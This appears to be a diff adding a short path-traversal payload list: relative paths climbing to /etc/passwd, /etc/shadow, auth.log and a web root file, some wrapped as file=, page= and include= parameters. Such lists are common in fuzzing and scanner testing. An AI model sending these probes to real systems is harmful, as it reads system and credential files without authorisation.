@@ -1,0 +1,7 @@
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../var/log/auth.log
+../../../../../../var/www/html/index.php
+file=../../../../../../etc/passwd
+page=../../../../../../etc/passwd
+include=../../../../../../etc/passwd
